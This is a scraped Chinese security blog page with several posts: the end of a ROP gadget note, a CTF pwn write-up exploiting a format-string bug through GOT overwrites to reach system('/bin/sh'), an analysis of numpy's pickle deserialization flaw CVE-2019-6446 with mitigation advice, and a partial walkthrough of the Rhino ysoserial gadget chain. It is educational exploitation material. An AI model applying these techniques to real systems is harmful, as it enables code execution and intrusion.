<li><p>1、只要<strong>Linux x64</strong> 的程序中调用了 <strong>libc.so</strong>，程序中就会自带一个很好用的通用Gadget：<strong>__libc_csu_init()</strong>。</p>
</li>
<li><p>2、<strong>__libc_csu_init()</strong> 的 <strong>0x400600</strong> 到 <strong>0x400624</strong> 其中包含了 <strong>pop rdi</strong>、<strong>pop rsi</strong>、<strong>pop rdx</strong>、<strong>ret</strong> 等指令，通过巧妙的组合可以实现调用任意单参数、双参数、三参数的函数，从而顺利泄漏libc函数地址并且获取系统 <strong>shell</strong>。</p>
</li>
<li><p>3、<strong>__libc_csu_init()</strong> 不只是一个通用 <strong>Gadget</strong>，完全就是“万能 <strong>Gadget</strong>”！</p>
</li>
</ul>
<h2 id="参考阅读："><a href="#参考阅读：" class="headerlink" title="参考阅读："></a>参考阅读：</h2><p>[1] 蒸米《一步一步学ROP之linux_x86篇》：<a href="https://zhuanlan.zhihu.com/p/23487280" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/23487280</a>  </p>
<p>[2] 蒸米《一步一步学ROP之linux_x64篇》：<a href="https://zhuanlan.zhihu.com/p/23537552" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/23537552</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2019/04/09/格式化字符串漏洞攻击实战/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/09/格式化字符串漏洞攻击实战/" itemprop="url">格式化字符串漏洞攻击实战</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-09T00:00:00+08:00">
                2019-04-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>来源：<a href="https://mp.weixin.qq.com/s/1UCz0aao3fpN1jgi_RJGcw" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
<p><a href="https://yaowendao.cn-bj.ufileos.com/cheating" target="_blank" rel="noopener">cheating</a> 是 <strong>CTF</strong> 里的一道 <strong>PWN</strong> 题。主要攻击点就在于格式化字符串漏洞的利用。</p>
<h2 id="一、陷阱"><a href="#一、陷阱" class="headerlink" title="一、陷阱"></a>一、陷阱</h2><p>题目中布置了一个陷阱。如果用 <strong>IDA 6.8</strong> 来分析就很容易陷入陷阱，用 <strong>IDA 7.0</strong> 分析就会发现一些不一样的地方。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/01-cheating-ida-strcmp.png" alt="IDA-strcmp"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/02-cheating-ida-puts.png" alt="IDA-puts"></p>
<p>可以发现，IDA 6.8 识别出的 <strong>strcmp、puts</strong> 被 IDA 7.0 识别为了 <strong>strncmp、printf</strong>。用 <strong>readelf -r</strong> 查看，和 <strong>IDA 6.8</strong> 的结果一致。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/03-cheating-readelf-r.png" alt="readelf-r"></p>
<p>为什么 <strong>IDA 6.8</strong> 和 <strong>readelf</strong> 会显示出错误的库函数？原因在于 <strong>cheating</strong> 文件中的 <strong>.dynstr section</strong> 进行了特殊处理，布置了一个陷阱。用 <strong>readelf -S</strong> 看下。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/04-cheating-readelf-S.png" alt="readelf-S"></p>
<p>可以看出，<strong>cheating</strong> 文件的 <strong>.dynstr</strong> 需要被加载到内存的 <strong>0x400490</strong> 地址，对应在文件中的 offset 为 <strong>0xf91</strong>。看下这个 <strong>string table</strong> 的内容。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/05-cheating-f91.png" alt="dynstr"></p>
<p>这个 <strong>string table</strong> 写的确实是 <strong>strcmp</strong> 和 <strong>puts</strong>。细心一点会发现，这两个函数名后面都有多余的0x00，出题者还是留下了一点篡改的痕迹：）</p>
<p>但事实上，加载 <strong>ELF</strong> 文件时，并不会加载 <strong>0xF91</strong> 的 <strong>string table</strong>，而是会加载位于 <strong>0x490</strong> 位置的 <strong>string table</strong>，这里才是对应 <strong>.dynstr</strong> 目标地址 <strong>0x400490</strong> 的真命天子 。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/06-cheating-490.png" alt="490">  </p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/07-cheating-400490.png" alt="400490"></p>
<p>好了，现在我们知道，可以关掉被误导的 <strong>IDA 6.8</strong>，继续用 <strong>IDA 7.0</strong> 来分析程序吧。</p>
<h2 id="二、主流程和-sub-400ACC-的输入检查"><a href="#二、主流程和-sub-400ACC-的输入检查" class="headerlink" title="二、主流程和 sub_400ACC() 的输入检查"></a>二、主流程和 <strong>sub_400ACC()</strong> 的输入检查</h2><p>首先看一下防御情况。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/01-cheating-checksec.png" alt="checksec"></p>
<p><strong>cheating</strong> 的主函数 <strong>sub_400BC0()</strong> 如下。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/08-cheating-main.png" alt="main"></p>
<p>函数的逻辑是：</p>
<ul>
<li>1、调用 <strong>sub_400ACC()</strong> 进行输入检查  <ul>
<li>1.1、如果检查不通过，goto 2  </li>
<li>1.2、如果检查通过，接收用户输入并传递给 <strong> printf</strong> 输出，触发格式化字符串漏洞  </li>
</ul>
</li>
<li>2、输出bye并退出  </li>
</ul>
<p>如果要触发格式化字符串漏洞，首先需要通过 <strong>sub_400ACC()</strong> 的检查。看一下这个检查函数。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/09-cheating-validating.png" alt="validation"></p>
<p>主要逻辑是：</p>
<ul>
<li>1、生成一个64字节的字符串，其中前十个字节固定为 <strong>“cheating U”</strong>， 后54个字节为0-9随机字符。  </li>
<li>2、用户输入字符串，与这个随机字符串进行 <strong>strncmp</strong>，相同则检查通过。</li>
</ul>
<p>处理了陷阱之后，我们会发现这里的检查函数用的是 <strong>strncmp</strong>，只比较了十一个字节。排除掉固定前缀 <strong>cheating U</strong> 的十个字节，也就只剩下一个字节，范围在 <strong>0-9</strong>。我们选定一个值（比如0），进行多次碰撞就可以了。如果没有识别出陷阱，把这里误以为是 <strong>strcmp</strong>，发现必须碰撞54个字节的随机值，就只能一头雾水地发呆啦。</p>
<p>攻击脚本如下。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/10-cheating-retry.png" alt="retry-validation"></p>
<p>接收到 <strong>slogan:</strong> 字符串，顺利通过检查！</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/11-cheating-retry-succ.png" alt="retry-success"></p>
<h2 id="三、格式化字符串漏洞"><a href="#三、格式化字符串漏洞" class="headerlink" title="三、格式化字符串漏洞"></a>三、格式化字符串漏洞</h2><p>通过校验之后，回到主函数 <strong>sub_400BC0()</strong> 的 <strong>if</strong> 分支内，这里是很明显的格式化字符串漏洞。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/08-cheating-main.png" alt="main"></p>
<p>标准做法，分三步来实现 <code>get shell</code>：</p>
<ul>
<li>解决程序的退出问题  </li>
<li>泄漏 <strong>system</strong> 和 <strong>/bin/sh</strong> 的地址  </li>
<li>执行 <strong>sytem(“/bin/sh”)</strong>，<strong>get shell</strong>  </li>
</ul>
<h3 id="3-1-程序退出问题"><a href="#3-1-程序退出问题" class="headerlink" title="3.1 程序退出问题"></a>3.1 程序退出问题</h3><p>很显然，<strong>printf</strong> 执行完成之后，程序就不再接收用户输入，而是继续执行并且退出。我们需要让程序不退出，而是重新回到触发格式化字符串漏洞的地方，以便于进一步的利用。</p>
<p>因此，我们需要找一个地址来改写，修改代码流程。看一下程序段，发现代码段是不能修改的，不过可以修改got表。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/12-cheating-sections.png" alt="sections"></p>
<p>很容易想到，把 <strong>exit</strong> 的 <strong>got</strong> 表地址改掉，改到 <strong>if</strong> 分支里，就可以在调用 <strong>exit</strong> 的时候回到主流程中。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/13-cheating-change-exit.png" alt="exit-change"></p>
<p><strong>exit</strong> 的 <strong>got</strong> 表地址是 <strong>0x602078</strong>，默认值是 <strong>plt</strong> 表中 <strong>exit</strong> 表项中jmp指令的下一条指令地址 <strong>0x400846</strong>，我们要将这个值，修改为目标地址 <strong>0x400BE9</strong>。也就是说，需要修改两个字节，将 <strong>0x602078</strong>地址的两个字节从 <strong>0x846</strong> 修改为 <strong>0xBE9</strong>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/15-cheating-exit-got.png" alt="exit-got"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/16-cheating-plt.png" alt="exit-plt"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/14-cheating-exit-change.png" alt="exit-change-addr"></p>
<p>所以，我们构造如下代码。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/17-cheating-repeat2main.png" alt="repeat2main"></p>
<p>执行之后，再次接收到 <strong>slogan:</strong> 字符串，成功将代码流程劫持，可以进入下一步攻击了。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/18-cheating-repeat-succ.png" alt="repeat2main_succ"></p>
<p>需要注意的是，我们将 <strong>exit()</strong> 的 <strong>got</strong> 地址修改为 <strong>0x400BE9</strong> 之后，实际上是通过一次 <strong>call</strong> 指令重入了当前函数，也就意味着栈被抬高了一层（<strong>call</strong> 指令用于保存函数返回地址）。后续继续使用 <strong>printf</strong> 的格式化字符串漏洞时，每次都会多偏移一个参数的位置，这一点需要注意。</p>
<h3 id="3-2-泄漏-system-和-bin-sh-的地址"><a href="#3-2-泄漏-system-和-bin-sh-的地址" class="headerlink" title="3.2 泄漏 system 和 /bin/sh 的地址"></a>3.2 泄漏 <strong>system</strong> 和 <strong>/bin/sh</strong> 的地址</h3><p>要 <strong>get shell</strong>，我们需要泄漏出 <strong>glibc</strong> 中 <strong>system()</strong> 和 <strong>/bin/sh</strong> 的地址。在环境提供了 <strong>libc.so.6</strong> 文件的条件下，我们只需要泄漏出任何一个库函数的地址，都可以通过文件中的偏移来计算出我们想要的符号地址。</p>
<p>看一下 <strong>got</strong> 表，我们选择 <strong>read</strong> 函数来泄漏地址。为什么选择 <strong>read</strong>？回看一下主函数。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/08-cheating-main.png" alt="main"></p>
<p>在存在漏洞的 <strong>printf</strong> 函数执行前，<strong>read</strong> 函数已经被调用了，所以此时 <strong>got</strong> 表中 <strong>read</strong> 函数的表项中已经保存了它在 <strong>glibc</strong> 库中的真实地址。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/19-cheating-got.png" alt="got"></p>
<p>也就是说，我们需要泄漏出 <strong>0x602050</strong> 地址的内容。用 <strong>“%s”</strong> 就好了。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/20-cheating-readaddr.png" alt="read_addr"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/21-cheating-calc-system.png" alt="calc_system"></p>
<p>成功获取到 <strong>system()</strong> 和 <strong>/bin/sh</strong> 的内存地址！</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/22-cheating-leak-succ.png" alt="leak-succ"></p>
<h3 id="3-3-执行-sytem-“-bin-sh”-，get-shell"><a href="#3-3-执行-sytem-“-bin-sh”-，get-shell" class="headerlink" title="3.3 执行 sytem(“/bin/sh”)，get shell"></a>3.3 执行 <strong>sytem(“/bin/sh”)</strong>，<strong>get shell</strong></h3><p>我们已经拿到 <strong>system</strong> 的地址，还有任意地址写的漏洞，也能布置栈空间。接下来就是看怎样调用 <strong>system(“/bin/sh”)</strong> 最方便了。</p>
<p>有很多方法可以实现这一步。最常用的方法是，利用 <strong>x64</strong> 程序的万能 <strong>gadget</strong>：<strong>init()</strong>函数，通过 <strong>ROP</strong> 来实现。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/24-cheating-init.png" alt="init-func"></p>
<p>有没有更轻松的方法呢？回看一眼主函数。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/08-cheating-main.png" alt="main"></p>
<p>咦？ <strong>printf</strong> 的入参就是用户输入的 <strong>buf</strong>。这就意味着，只要我们把 <strong>printf</strong> 的 <strong>got</strong> 表改成 <strong>system</strong> 的地址，下一轮迭代时再发送 <strong>“/bin/sh”</strong> 的字符串，就可以直接执行 <strong>system(“/bin/sh”)</strong> 了，很简单是不是：）</p>
<p>查一下 <strong>got</strong> 表。<strong>printf</strong> 的地址是 <strong>0x602030</strong>，我们的目标是将这个地址的内容改写为前面获取到的 <strong>system</strong> 函数的真实地址。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/25-cheating-got-printf.png" alt="got-printf"></p>
<p>攻击脚本如下：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/26-cheating-call-system.png" alt="call-system"></p>
<p>执行一下，成功 <strong>Get Shell</strong> ！</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/27-cheating-getshell.png" alt="get-shell"></p>
<h2 id="四、One-More-Thing"><a href="#四、One-More-Thing" class="headerlink" title="四、One More Thing"></a>四、One More Thing</h2><p><a href="https://github.com/L4ys/LazyIDA" target="_blank" rel="noopener"><strong>LazyIDA</strong></a> 是 <strong>IDA Pro</strong> 的一个插件，其中有一个功能是“扫描格式化字符串漏洞 Scan String Format Vulnerabilities”。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/28-cheating-scan-format-string-vuln.png" alt="scan-string-format"></p>
<p>扫描一下看看，很快就找到了漏洞点。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/29-cheating-scan-vuln-result.png" alt="scan-string-format-result"></p>
<blockquote>
<p>附：</p>
<p>原始程序下载：<a href="https://yaowendao.cn-bj.ufileos.com/cheating" target="_blank" rel="noopener">cheating</a></p>
<p>攻击脚本链接：<a href="https://yaowendao.cn-bj.ufileos.com/pwn_cheating.py" target="_blank" rel="noopener">pwn_cheating.py</a></p>
<p>LazyIDA 下载：<a href="https://github.com/L4ys/LazyIDA" target="_blank" rel="noopener">LazyIDA</a> </p>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2019/03/24/CVE-2019-6446浅析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/24/CVE-2019-6446浅析/" itemprop="url">CVE-2019-6446 浅析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-24T00:00:00+08:00">
                2019-03-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>来源：<a href="https://mp.weixin.qq.com/s/dTlMWs7zWYPdyXtlyK-ZDg" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
<h2 id="python-的反序列化"><a href="#python-的反序列化" class="headerlink" title="python 的反序列化"></a>python 的反序列化</h2><p>反序列化漏洞通常需要两个条件：</p>
<p><strong> 1、用户可控的反序列化入口 </strong></p>
<p>例如 <code>PHP</code> 的 <code>unserialize()</code>、<code>Java</code> 的 <code>readObject()</code> 。 </p>
<p><strong> 2、运行环境中存在调用了危险函数的 magic function </strong></p>
<p>例如 <code>PHP</code> 的 <code>__wakup()</code>、 <code>__destruct()</code> 以及 <code>Java</code> 的 <code>readObject()</code>。</p>
<p>满足这两个条件的前提下，我们构造第二个条件的对象（也就是 <code>Gadget</code>），并将其序列化后传递给第一个条件的入口，就可以成功触发反序列化漏洞了。</p>
<p>相对而言，第二个条件的利用更难，所以就诞生了 <code>ysoserial</code> 和 <code>marshalsec</code> 这样的 Gadget 生成器。</p>
<p>不过，对于 <code>python</code> 而言，反序列化漏洞的利用就简单多了，因为，<code>python</code> 的反序列化 <code>Gadget</code> 不需要存在于原有的运行环境中，而是可以通过序列化数据直接传递。</p>
<p>看个例子。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/01-numpy-write.png" alt="01-write"></p>
<p>代码将 <code>Test</code> 类的对象序列化到 <code>payload</code> 文件中，其中在 magic function <code>__reduce__()</code> 中注入了恶意命令 <code>ls</code> 。接下来是反序列化。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/02-numpy-read.png" alt="02-read"></p>
<p>看看结果。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/03-numpy-result.png" alt="03-result"></p>
<p>可以看到，序列化到 <code>payload</code> 中的命令 <code>ls</code> 被成功地执行了。</p>
<p>因此，<code>python</code> 的反序列化漏洞利用，只需要满足第一个条件“用户可控的反序列化入口”就好了。</p>
<h2 id="CVE-2019-6446"><a href="#CVE-2019-6446" class="headerlink" title="CVE-2019-6446"></a>CVE-2019-6446</h2><p>现在来看看 <code>numpy</code> 的这个 CVE。<code>numpy</code> 是非常流行的用于科学计算的<code>python</code>开源库，包括<code>TensorFlow</code>在内的许多项目都使用了 <code>numpy</code>。</p>
<p><code>numpy</code> 提供了一个接口 <code>numpy.load()</code>，定义长这样：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/04-numpy-load.png" alt="04-load"></p>
<p>函数里首先打开 <code>file</code> 文件，赋值给 <code>fid</code></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/05-numpy-load-file.png" alt="05-file"></p>
<p>随后判断文件头。当文件头既不满足 <code>zip</code> 格式也不满足 <code>numpy</code> 格式时，<code>numpy</code> 直接做了一个操作：反序列化。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/06-numpy-pickle.png" alt="06-pickle"></p>
<p>也就是说，只要我们将恶意的序列化内容传递给 <code>numpy.load()</code> 函数，就可以触发这个漏洞。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/07-numpy-read.png" alt="07-numpy-read"></p>
<p>运行结果是：</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/08-numpy-run.png" alt="08-numpy-run"></p>
<p>成功执行了在序列化文件 <code>payload</code> 中注入的 <code>ls</code> 命令。</p>
<h2 id="如何预防"><a href="#如何预防" class="headerlink" title="如何预防"></a>如何预防</h2><p>首先，一个通用的原则：不要对不可信的数据进行反序列化。</p>
<p>其次，就 <code>numpy</code> 的这个 CVE 而言，可以注意到在进行反序列化之前有一个判断：<code>allow_pickle</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/09-numpy-allowpickle.png" alt="09-allowpickle"></p>
<p><code>allow_pickle</code> 其实是 <code>numpy.load()</code> 的第三个参数，可选，默认为 <code>True</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/10-numpy-allowpickle-true.png" alt="10-allowpickle"></p>
<p>只要在调用 <code>numpy.load()</code> 的时候，将 <code>allow_pickle</code> 置为 <code>False</code> 就可以避免反序列化操作了。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/11-numpy-allowpickle-false.png" alt="11-allowpickle-false"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.yaowendao.com/2018/02/24/Mozilla Rhino反序列化漏洞POC分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="香依香偎">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/image/0.jpeg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="闻道解惑">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/02/24/Mozilla Rhino反序列化漏洞POC分析/" itemprop="url">Mozilla Rhino 反序列化漏洞 POC 分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-24T00:00:00+08:00">
                2018-02-24
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>来源：<a href="https://mp.weixin.qq.com/s/qm3mS78r43IIOHgZ-6YyGw" target="_blank" rel="noopener">香依香偎@闻道解惑</a></p>
<p><strong>Mozilla Rhino</strong> 是一个完全使用 Java 语言编写的开源 JavaScript 引擎。ysoserial 中收录了 Rhino 的反序列化 Gadget，本篇文章就来分析一下这个 Gadget。</p>
<h2 id="零、NativeError-的继承关系"><a href="#零、NativeError-的继承关系" class="headerlink" title="零、NativeError 的继承关系"></a>零、NativeError 的继承关系</h2><p>首先来看 <code>org.mozilla.javascript.NativeError</code> 类的继承关系。它继承自 <code>IdScriptableObject</code>，后者继承自 <code>ScriptableObject</code>。而 <code>ScriptableObject</code> 实现了 <code>Scriptable</code> 接口和 <code>Serializable</code> 接口。因此，<code>NativeError</code> 可以进行序列化和反序列化操作。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/00-class.png" alt="NativeError.class"> </p>
<h2 id="一、分析"><a href="#一、分析" class="headerlink" title="一、分析"></a>一、分析</h2><p><strong>1、</strong> 首先，反序列化攻击的入口在 <code>NativeError</code> 的 <code>toString()</code> 函数。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/01-nativeerror.png" alt="NativeError.toString"> </p>
<p><code>toString()</code> 中调用了 <code>js_toString()</code> 函数，传入参数为 <code>NativeError</code> 的 this 对象。看下<code>js_toString()</code> 。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/02-js_toString.png" alt="NativeError.js_toString"> </p>
<p><code>js_toString()</code> 调用了两次 <code>getString()</code> 函数，传入的参数是 <code>NativeError</code> 对象和字符串 name/message，继续跟进。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/03-getString.png" alt="NativeError.getString"> </p>
<p><code>getString()</code> 中调用的是父类 <code>ScriptableObject</code> 的 <code>getProperty()</code> 函数，入参没有变化。跟进去看看。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/04-ScriptableObject.getProperty.png" alt="ScriptableObject.getProperty"> </p>
<p>其中调用的是 <code>Scriptable</code> 接口的 <code>get()</code> 函数。这个 <code>get()</code> 的实现在 <code>IdScriptableObject</code> 类。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/05-IdScriptableObject.get.png" alt="IdScriptableObject.get"> </p>
<p><code>IdScriptableObject.get()</code> 最后调用的是父类 <code>ScriptableObject</code> 的 <code>get()</code> 函数，再次回到 <code>ScriptableObject</code> 类。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/06-ScriptableObject.get.png" alt="ScriptableObject.get"> </p>
<p>继续跟进 <code>getImpl()</code> 函数。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/07-ScriptableObject.getImpl.png" alt="ScriptableObject.getImpl"> </p>
<p>其中的关键在于 2007 行到 2026 行的这部分。先看 2009 行到 2020 行的第一个分支。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/08-getImpl-2-branch.png" alt="getImpl-branches.png"> </p>
<p>这个分支中有 <code>nativeGetter.invoke()</code> 的调用，看上去有戏。但有一个问题在于，<code>nativeGetter.delegateTo</code> 是 <code>transient</code> 变量，在反序列化过程中无法赋值。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/09-transient-delegateTo.png" alt="transient-delegateTo"> </p>
<p>这会导致 2013 行 <code>if (nativeError.delegateTo == null)</code> 的判断恒真，<code>getterThis</code> 就被赋值为最初的 <code>NativeError</code> 对象。这就导致 2020 行的 <code>nativeGetter.invoke()</code> 无法调用我们期望的目标对象的函数，只能调用静态函数或者 <code>NativeError</code> 类的内置函数。这当然不是我们期望的结果。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/10-nativeGetter.invoke.png" alt="nativeGetter.invoke"> </p>
<p>再来看 2021 行到 2026 行的 <code>else</code> 分支。</p>
<p> <img src="https://yaowendao.cn-bj.ufileos.com/11-getImpl-branch-2.png" alt="getImpl-else-branch"> </p>
<p>这个分支中需要将 <code>getterObj</code> 设置为 <code>Function</code> 对象，并最终调用 <code>Function</code> 的 <code>call()</code> 函数。先看看 <code>getterObj</code> 如何赋值。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/62-ScriptableObject-getterObj.png" alt="ScriptableObject-getterObj"></p>
<p>通过 <code>GetterSlot</code> 的 <code>getter</code>。<code>GetterSlot</code> 是 <code>ScriptableObject</code> 的内部类，支持序列化。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/63-GetterSlot-getter.png" alt="GetterSlot-getter"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/64-GetterSlot-classes.png" alt="GetterSlot-classes"></p>
<p><code>GetterSlot.getter</code> 可以通过 <code>ScriptableObject.setGetterOrSetter()</code> 来进行赋值。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/65-ScriptableObject-setGetterOrSetter.png" alt="ScriptableObject-setGetterOrSetter"></p>
<p>那么 <code>getterObj</code> 要赋值成 <code>Function</code> 的哪个对象呢？<code>Function</code> 是个接口，看下它的实现类。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/12-Function-classes.png" alt="Function-classes"></p>
<p>我们选择 <code>NativeJavaMethod</code> 类。这个类继承自 <code>BaseFunction</code>，后者同样继承自 <code>IdScriptableObject</code>，因此同样可以进行序列化和反序列化处理。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/13-NativeJavaMethod-classes.png" alt="NativeJavaMethod-classes"></p>
<p><code>NativeJavaMethod.call()</code> 函数挺长，翻一翻会发现在 247 行调用了 <code>meth.invoke(javaObject, args)</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/14-NativeJavaMethod.call.png" alt="NativeJavaMethod.call"></p>
<p>这个 <code>invoke()</code> 的调用，其实是 <code>MemberBox.invoke()</code> 函数，其中直接调用了我们熟悉的 <code>method.invoke()</code> 函数。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/15-MemberBox.invoke.png" alt="MemberBox.invoke"></p>
<p>看起来很有希望。为了能成功调用到我们期望的目标函数，我们需要关注 <code>NativeJavaMethod.call()</code> 中 <code>meth.invoke(javaObject, args)</code> 里的三个变量：<code>meth</code>、<code>javaObject</code>和<code>args</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/14-NativeJavaMethod.call.png" alt="NativeJavaMethod.call"></p>
<p>一个一个来，先看 <code>meth</code>。</p>
<p><strong>2、</strong><code>meth</code> 的值来自类的成员变量 <code>methods</code>，通过 <code>findFunction()</code> 查找到索引 <code>index</code>。 </p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/16-NativeJavaMethod-methods.png" alt="NativeJavaMethod.methods"></p>
<p>成员变量 <code>methods</code> 是 <code>MemberBox</code> 类的对象数组，本身可以通过反序列化赋值。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/61-NativeJavaMethod.methods.png" alt="NativeJavaMethod.methods"></p>
<p>至于 <code>methods</code> 的内容要设置成什么样，来看下 <code>MemberBox.invoke()</code> 函数。其中 <code>method</code> 来自 <code>method()</code> 函数，而后者是直接返回了 <code>memberObject</code> 变量。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/15-MemberBox.invoke.png" alt="MemberBox.invoke"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/17-MemberBox-method.png" alt="MemberBox-method"></p>
<p><code>MemberBox.memberObject</code> 是个 transient 变量，要怎么赋值呢？</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/18-MemberBox-memberObject.png" alt="MemberBox-memberObject"></p>
<p>答案就在 <code>MemberBox.readObject()</code> 中。这里先通过 <code>readMember()</code> 得到了 member 对象，再通过 <code>init()</code> 函数将 <code>member</code> 赋值给 <code>memberObject</code>。</p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/19-MemberBox.readObject.png" alt="MemberBox.readObject"></p>
<p><img src="https://yaowendao.cn-bj.ufileos.com/20-MemberBox.init.png" alt="MemberBox.init"></p>
